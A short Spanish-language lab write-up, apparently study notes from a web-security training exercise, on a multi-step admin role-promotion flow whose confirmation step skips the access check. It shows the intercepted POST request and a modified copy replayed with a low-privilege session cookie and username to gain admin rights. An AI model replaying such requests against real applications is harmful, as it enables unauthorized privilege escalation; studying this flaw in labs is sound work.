# Paso sin control de acceso en proceso múltiple

Tags: #AccessControl #BurpSuite 

```bash 
En este lab se observa cómo una promoción de roles en la sección de administración requiere varias etapas.

Aunque la primera fase valida permisos, la segunda no lo hace correctamente. Al interceptar la solicitud de confirmación en Burp y reutilizarla con nuestra propia sesión y usuario, se logra promocionar a administrador sin tener privilegios. Un fallo crítico en la aplicación al no validar de nuevo quién realiza el segundo paso.
```

```bash 
# Capturar la segunda petición que es en donde se acontece la vulnerabilidad 
	POST /admin-roles HTTP/2
	Cookies: session=12345
	
	action=upgrade&confirmed=true&username=omar
```

```bash 
# Petición modificada con el nuevo usuario y su cookie 
	POST /admin-roles HTTP/2
	Cookies: session=54321
	
	action=upgrade&confirmed=true&username=juan
```

